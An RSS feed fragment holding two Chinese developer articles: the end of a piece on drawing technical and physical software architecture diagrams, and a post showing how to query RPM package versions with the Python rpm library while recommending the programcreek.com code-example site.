data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958ASqzB3ickhoXSI1NW5edw8ofWMh4IsgprWPtia23U8Ouk8Cic6gB9HH8XA/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1280&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;图 2&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2. 局部&lt;/span&gt;&lt;/p&gt;&lt;p&gt;在整体框架的基础上，对每一个局部的子系统进行详细的技术实现的表达。子系统的技术架构图中需要展示每个子系统使用的技术组件，比如（缓存技术、消息中间件、流程引擎、流式计算框架等等）。同时，这些技术组件是如何实现业务功能，需要清晰的展示技术实现逻辑。&lt;/p&gt;&lt;p&gt;下图是对风控系统中的实时引擎、离线引擎、准实时引擎三个子系统的进行的技术架构。在实时引擎中，主要使用 RuleEngine（规则引擎）作为技术特点，这里就重点列出 RuleEngine。准实时引擎使用 Blink 作为流计算的技术框架，并概要的展示了计算逻辑。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5576619273301737&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958A6zsDY3BVLB47AcEVhuvYnsOVwPLG5A2ra3AcLsuTFWuK9qyOXgsxCw/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;1266&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;图 3&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt; 3. 整体&lt;/span&gt;&lt;/p&gt;&lt;p&gt;在完成每个子系统的技术实现后，最终进行一次整合，绘制一张总体的系统技术架构图。各子系统之间通过服务接口、数据库、缓存或消息中间等技术实现数据交互，以此将打通各个子系统，实现最终整个产品从数据、技术的串联。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5803149606299213&quot; data-s=&quot;300,640&quot; data-type=&quot;jpeg&quot; data-w=&quot;1270&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958AWI6GaIicx63pUauFjte2CL9jKX5ia1uNXwgZ5G12EETaNX9BpVp3z3Cw/640?wx_fmt=jpeg&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;图 4&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;3.2 物理架构图&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;物理架构偏重于网络设计、集群设计、中间件设计、数据存储设计等基础软硬件的设计架构。非功能需求的技术架构图重点在于展示企业系统在物理上是如何部署。物理架构规定了组成系统的物理元素、物理元素之间的关系以及他们的部署策略。物理架构反映出软件系统动态运行时的组织情况。从物理架构图中，我们能够全局的得知整个系统是如何从流量访问、数据流转、数据存储到技术组件的运转。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8264984227129337&quot; data-s=&quot;300,640&quot; data-type=&quot;jpeg&quot; data-w=&quot;1268&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958AySEjrTcwCj7lewmvN5fUgdpCnq1e0QWhEzNGQic3k5LBic8gk8OcmH4A/640?wx_fmt=jpeg&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;图 5&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;总  结&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;我们从架构的本质开始，分别对业务架构、产品架构、数据架构、应用架构、技术架构的设计提供了一些思路和原则。这些思路和原则在进行架构设计和画架构图的过程中提供一些指导帮助。最后我们再来思考一个问题，好的软件架构是规划还是演化出来？&lt;/p&gt;&lt;p&gt;架构规划对架构的影响是很重大的。首先，好的架构是设计出来的。好的架构，系统的性能和质量都将很高。架构设计的质量直接影响架构后续向好的方向演化的难易程度。架构设计如同城市规划一样，缺少规划将难于演化。&lt;/p&gt;&lt;p&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.34490923441199683&quot; data-s=&quot;300,640&quot; data-type=&quot;jpeg&quot; data-w=&quot;1267&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/YriaiaJPb26VOjoNXrahuic8dvLOo1r958A3fJARZKlibOSQXfL937NC81HBaCia68DZHgzMnTQ3Eh4l0h9EPWnNRsw/640?wx_fmt=jpeg&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;图 6&lt;/span&gt;&lt;/p&gt;&lt;p&gt;演化是一个过程，这个过程或长或短，所以演化需要考虑系统的生命周期。如果演化的过程非常漫长，超出了软件的生命周期，即使架构越来越优化，对于产品或者项目的帮助也将有限，所以时间这个约束条件是非常苛刻的。&lt;/p&gt;&lt;p&gt;在现有规划的基础上进行演化，我们无法得到普适的架构，但可以得到确定领域的通用架构，可以在特定领域通过演化使架构逐步优化，帮助业务快速的发展。&lt;/p&gt;&lt;p&gt;&lt;span&gt; 作者简介&lt;/span&gt;&lt;/p&gt;&lt;p&gt;胡斌，菜鸟网络技术专家，目前负责菜鸟风控系统的建设。曾在淘宝技术部先后负责卖家平台、商家运营等领域。在大规模分布式应用、大数据、架构领域有多年的开发和管理经验。&lt;/p&gt;&lt;section&gt;&lt;br/&gt;&lt;/section&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-paragraph-type=&quot;ignored&quot;&gt;&lt;pre&gt;&lt;section&gt;&lt;span&gt;热门内容：&lt;/span&gt;&lt;/section&gt;&lt;/pre&gt;&lt;section&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-copyright=&quot;0&quot; data-fileid=&quot;100034207&quot; data-ratio=&quot;0.5214592274678111&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/rtJ5LhxxzwmeeDF9fPPQbQ24cJV10eLE8S3wgTkdrg5ZMg02G0Nh0TCnYtajMyr1SuW0Wup1iaaqRYZxcKAYZHQ/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;932&quot;/&gt;&lt;/section&gt;&lt;pre ng-bind-html=&quot;message.MMActualContent&quot;&gt;&lt;section data-mpa-template=&quot;t&quot; mpa-paragraph-type=&quot;ignored&quot;&gt;&lt;pre&gt;&lt;section&gt;&lt;span&gt;最近面试BAT，整理一份面试资料&lt;/span&gt;&lt;span&gt;《&lt;strong&gt;Java面试BAT通关手册&lt;/strong&gt;》&lt;/span&gt;&lt;span&gt;，覆盖了Java核心技术、JVM、Java并发、SSM、微服务、数据库、数据结构等等。&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;span&gt;获取方式：点“&lt;/span&gt;&lt;span&gt;在看&lt;/span&gt;&lt;span&gt;”，关注公众号并回复 &lt;/span&gt;&lt;span&gt;666&lt;/span&gt;&lt;span&gt; 领取，更多内容陆续奉上。&lt;/span&gt;&lt;/section&gt;&lt;/pre&gt;&lt;/section&gt;&lt;/pre&gt;&lt;/section&gt;&lt;section&gt;&lt;strong&gt;明天见(｡･ω･｡)ﾉ♡&lt;/strong&gt;&lt;/section&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
<item>
<guid>13d0ea37fe1e4a357fbf0bec787ee5e1</guid>
<title>一个小破网站，居然比 Python 官网还牛逼</title>
<link>https://toutiao.io/k/noxp0wx</link>
<content:encoded>&lt;div&gt;&lt;div&gt;&lt;p class=&quot;original_area_primary&quot;&gt;
                                                                                                &lt;/p&gt;

                    
                                            &lt;div class=&quot;rich_media_content &quot; id=&quot;js_content&quot;&gt;
                    

                    
                    
                    
                    &lt;p data-mpa-powered-by=&quot;yiban.io&quot;&gt;&lt;span&gt;前两天，我发现有个前同事写的 Shell 脚本经常在出问题，考虑这个脚本一直挺不稳定的，维护起来也挺头疼，原因是 Shell 脚本写稍微复杂一点的逻辑，代码就变得十分臃肿，对比 Python 真的太差劲了。&lt;/span&gt;&lt;span/&gt;&lt;/p&gt;&lt;p&gt;这个 Shell 脚本中有一个功能是检查机器上的 rpm 包与中心端的包版本进行对比，在本地用 Shell 取 rpm 信息很方便，但要取 rpm 包版本，其实是很难的。&lt;/p&gt;&lt;p&gt;原因是 rpm 包的版本格式分非常多种，根本无法使用简单的字符串分割来取得具体的版本号，更不用说版本对比。&lt;/p&gt;&lt;p&gt;在重写这个功能的时候，我在找到了能直接获取 Linux 机器 rpm 包的 Python 接口库，这个库要使用 yum 进行安装&lt;/p&gt;&lt;pre&gt;&lt;code&gt;yum install -y rpm-python&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;装上之后，就可以直接导入使用。&lt;br/&gt;由于不是通过 pip 安装的，因此 rpm-python 是安装在&lt;code&gt;/usr/lib64/python2.7/site-packages/&lt;/code&gt; 目录下的。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;import&lt;/span&gt; rpm&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpm.__path__&lt;br/&gt;[&lt;span&gt;&#x27;/usr/lib64/python2.7/site-packages/rpm&#x27;&lt;/span&gt;]&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2&gt;&lt;span&gt;# &lt;/span&gt;&lt;span&gt;1. 问题来了&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;接口库找到了，也安装上了，可问题是。。。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;该怎么用？？？&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;你以为百度一下就知道了？&lt;/p&gt;&lt;p&gt;百度出来的，关于这个库的介绍几乎没有。找到的几个也不知所云，完全 get 不到逻辑。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5684210526315789&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMGBicRvgcHcu5rr48jgPCxJHp8QEQ7VmYIAIxbLnsAK1ysJGrOMFu9fA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1710&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;于是我尝试着去该库的 pypi 和 github 上，希望找到一些 demo 啥的，先入个门。&lt;/p&gt;&lt;p&gt;看来是我想多了，要啥没啥，一片空白。。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5190839694656488&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMSLkxLuChgNCVTib2XZN4icSFFwymibMntjoa5ohPDV16St9EFQ4voaDZQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2358&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;br/&gt;&lt;/figure&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.74&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMuf3iahPEsCd014p2lqQLUnzictYibHzoTYk3BtJRUSOfkBZm9fuWdGgicg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1800&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;section&gt;&lt;p&gt;使用 &lt;code&gt;help&lt;/code&gt; 查看呢？更是一头雾水，没提取到有用的信息&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.7245240761478163&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMPeIcn3txBXXWE9OCEv77WAUOJZGzRhSSiau5YB27GEaOllo1ANoxibfg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1786&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;/section&gt;&lt;h2&gt;&lt;span&gt;# &lt;/span&gt;&lt;span&gt;2. 神奇的网站&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;好在 Google 上还是有点用的，它把一个神奇的网站推送到了我的面前，这个网站，就是今天我要为你介绍的主角。&lt;/p&gt;&lt;p&gt;网站的主界面如下，站如其名啊，就是通过 &lt;strong&gt;代码示例&lt;/strong&gt; 来让你学习各种库的使用。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.489769820971867&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMq4Uuw2yC1R0L7YCiaDBpLCFt85V9jkNW19hZuKkv1wcPfYLHibgtWNzA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1564&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;整个网站非常的简洁，只有一个搜索框，在这个搜索框里输入你想要学习的 python 库，就会立马为你找到该库的用法示例，并且会查到当前有多少的开源项目在使用它。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4489795918367347&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMrEG36sfQ0icvYiaMSBiaIkReabnvqt44iaoIs0lSH1q08WvX8PPBfRwRNA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1764&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;很明显上面的第二个包，才是我们需要的东西，点进去后，你会发现一个全新的世界。&lt;/p&gt;&lt;p&gt;在你面前的是一个又一个的完整的代码示例，这些示例系统、全面，非常适合初次学习阶段的理解。&lt;/p&gt;&lt;p&gt;需要强调的是，这些示例全部摘自开源项目，然后按照每个示例上方的链接转到原始项目或源文件。&lt;/p&gt;&lt;p&gt;若你觉得有些示例的代码写得不错，对你也有帮助的，可以给它点个赞。。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;1.0357142857142858&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMz5mlqGdrCdnY5qUib4xdAJugPWCRBty0yphFSpvLtV8licnmSxqMOGGA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;2128&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;就以 &lt;code&gt;rpm&lt;/code&gt; 库为例，来感受一下。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;获取已安装的所有所有 rpm 包&lt;/strong&gt;&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.3787528868360277&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oM8fs0ewGfg59qxia8ia8T7zCBqc5HsSK5vRxE1aicQ0zDaarmb7R0p35Bw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1732&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;检查一个库是否已经安装过？&lt;/strong&gt;&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.351508120649652&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMATATyBiaBhIhHlibqVeoA8WibtGWrYz8YalFicfzjKHOXXiaiaVcTjlicg4rg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1724&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;如何根据关键词搜索指定的包并精准获取其版本&lt;/strong&gt;&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.4040047114252061&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oM49A5IxHWTwTmHKTdiaOWITgpQt4WYiaEySqNqerUPUC5Lchrdc4nianMQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1698&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;strong&gt;如何获取离线rpm包的信息&lt;/strong&gt;&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.5791962174940898&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMTEwgaHZN0tSO9tRdG8wIIBfJmBKT3HyUJWRlNlibIhoVLvZyIXp3biaA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1692&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;还有挺多示例的，这里就不一一列举了。&lt;/p&gt;&lt;p&gt;参照着上面给出的真实案例，我也整理出我属于我自己的 rpm 包的用法，比全网 90% 的文章都来得清晰易懂&lt;/p&gt;&lt;p&gt;rpm 包无非就分两种：&lt;/p&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;未安装的 rpm 包&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;已安装的 rpm 包&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;想要获取这两种包，方式是不一样的。&lt;/p&gt;&lt;h3&gt; &lt;span&gt;获取未安装的 rpm 包信息&lt;/span&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;import&lt;/span&gt; rpm&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; ts = rpm.TransactionSet()&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpmhdr = ts.hdrFromFdno(&lt;span&gt;&quot;/root/librbd1-devel-10.2.10-0.el7.centos.x86_64.rpm&quot;&lt;/span&gt;)&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpmhdr[&lt;span&gt;&quot;NAME&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;librbd1-devel&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpmhdr[&lt;span&gt;&quot;VERSION&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;10.2.10&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpmhdr[&lt;span&gt;&quot;RELEASE&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;0.el7.centos&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; rpmhdr[&lt;span&gt;&quot;ARCH&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;x86_64&#x27;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h3&gt; &lt;span&gt;获取已安装的 rpm 包信息&lt;/span&gt;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; &lt;span&gt;import&lt;/span&gt; rpm&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; ts = rpm.TransactionSet()&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; query = ts.dbMatch(&lt;span&gt;&quot;name&quot;&lt;/span&gt;, &lt;span&gt;&quot;librbd1&quot;&lt;/span&gt;)&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; query.count()&lt;br/&gt;&lt;span&gt;1&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; pkg_info = next(query)&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; pkg_info[&lt;span&gt;&quot;NAME&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;librbd1&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; pkg_info[&lt;span&gt;&quot;VERSION&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;12.2.9.1.1&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; pkg_info[&lt;span&gt;&quot;RELEASE&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;0.el7.centos&#x27;&lt;/span&gt;&lt;br/&gt;&amp;gt;&amp;gt;&amp;gt; pkg_info[&lt;span&gt;&quot;ARCH&quot;&lt;/span&gt;]&lt;br/&gt;&lt;span&gt;&#x27;x86_64&#x27;&lt;/span&gt;&lt;br/&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;但喝水不忘挖井人，以上都是从这个网站中提炼出来的。&lt;/p&gt;&lt;p&gt;本篇文章的主角并不是 &lt;code&gt;rpm&lt;/code&gt; 这个库的用法，而是上面这个网站。&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;span&gt;与 Python 官方网站提供的标准库示例不一样（赶紧切点题，不然有人说我标题党了）&lt;/span&gt;&lt;/strong&gt;，这个网站 ，&lt;span&gt;&lt;strong&gt;不仅涵盖了 Python 的内置库，只要你能说得上名的 Python 库&lt;/strong&gt;&lt;/span&gt;（当然你自己测试上传到 pypi 的那种库肯定不能算是吧）&lt;span&gt;&lt;strong&gt;应该都在这个网站上找到你对应的代码示例&lt;/strong&gt;&lt;/span&gt;。&lt;/p&gt;&lt;figure&gt;&lt;img class=&quot;rich_pages wxw-img&quot; data-ratio=&quot;0.8671399594320487&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/QB6G4ZoE185AuRII3ncniaicCRnyLoE5oMmic2I9pn9hOG4WRH6SQ2AZia3rY9qB36ickeLV1ibyRYeF0sO6k9Vvfiaww/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1972&quot; title=&quot;&quot;/&gt;&lt;/figure&gt;&lt;p&gt;全站所收录的 python 库大概有将近 &lt;span&gt;&lt;strong&gt;2000 &lt;/strong&gt;&lt;/span&gt;个，对应大多数人的开发应该都能满足了，并且最重要的是，上面的示例全部来源真实的项目，因此更具参考价值。&lt;/p&gt;&lt;p&gt;这个网站的地址：&lt;br/&gt;https://www.programcreek.com/python/&lt;span/&gt;&lt;/p&gt;&lt;p&gt;&lt;span/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;- EOF -&lt;/span&gt;&lt;/p&gt;&lt;section donone=&quot;shifuMouseDownCard(&#x27;shifu_c_030&#x27;)&quot; label=&quot;Copyright Reserved by PLAYHUDONG.&quot;&gt;&lt;section&gt;&lt;span&gt;推荐阅读&lt;/span&gt;  &lt;span&gt;点击标题可跳转&lt;/span&gt;&lt;/section&gt;&lt;section&gt;&lt;p&gt;&lt;span&gt;1、&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjEyNTA5Mw==&amp;amp;mid=2652589123&amp;amp;idx=1&amp;amp;sn=91834e9141c21903aceb42b696ef0f66&amp;amp;chksm=84656409b312ed1f092c45327efdacc7f1461ea4a88eb07fb0b3214a5c659e98ba449c1c97ac&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;AI 深情表白，火爆外网！&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;AI 深情表白，火爆外网！&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;2、&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjEyNTA5Mw==&amp;amp;mid=2652587795&amp;amp;idx=2&amp;amp;sn=946f37537b3142eda68968a3828dac0a&amp;amp;chksm=84656f59b312e64f84fbe4539cf38370250428a096d3040c0893cc009b3db199c6023aa0aee0&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;一个「神奇」的Python库，99%的人都爱！&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;11&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;一个「神奇」的Python库，99%的人都爱！&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3、&lt;a target=&quot;_blank&quot; href=&quot;http://mp.weixin.qq.com/s?__biz=MzA4MjEyNTA5Mw==&amp;amp;mid=2652583691&amp;amp;idx=2&amp;amp;sn=189add0567c259972436e25f19453f80&amp;amp;chksm=84651f41b31296577f86e753b48b34baf771f2dd5d1be23dd63df62da06c83e319834edc4a5a&amp;amp;scene=21#wechat_redirect&quot; textvalue=&quot;强大的 Python 信号库：blinker 入门教程&quot; linktype=&quot;text&quot; imgurl=&quot;&quot; imgdata=&quot;null&quot; data-itemshowtype=&quot;0&quot; tab=&quot;innerlink&quot; data-linktype=&quot;2&quot;&gt;强大的 Python 信号库：blinker 入门教程&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;&lt;/section&gt;&lt;/section&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;觉得本文对你有帮助？请分享给更多人&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;推荐关注「Python开发者」，提升Python技能&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;&lt;section class=&quot;mp_profile_iframe_wrp&quot;&gt;&lt;mpprofile class=&quot;js_uneditable custom_select_card mp_profile_iframe&quot; data-pluginname=&quot;mpprofile&quot; data-id=&quot;MzA4MjEyNTA5Mw==&quot; data-headimg=&quot;http://mmbiz.qpic.cn/mmbiz_png/fhujzoQe7TpvdeLibiaAmU69kV0SyJIicdHKNjs7Cj55MMnHdNdX7mLRzmODUgfYTIb6pQXe10QcibSsPpHib7Ap7rw/0?wx_fmt=png&quot; data-nickname=&quot;Python开发者&quot; data-alias=&quot;PythonCoder&quot; data-signature=&quot;点击获取精选Python开发资源。「Python开发者」日常分享 Python 相关的技术文章、实用案例、工具资源、精选课程、热点资讯等。&quot; data-from=&quot;0&quot;/&gt;&lt;/section&gt;&lt;p&gt;&lt;span/&gt;&lt;span&gt;点赞和在看就是最大的支持&lt;/span&gt;&lt;span&gt;❤️&lt;/span&gt;&lt;/p&gt;
                &lt;/div&gt;

                

                



                
                &lt;/div&gt;&lt;/div&gt;</content:encoded>
</item>
</channel></rss>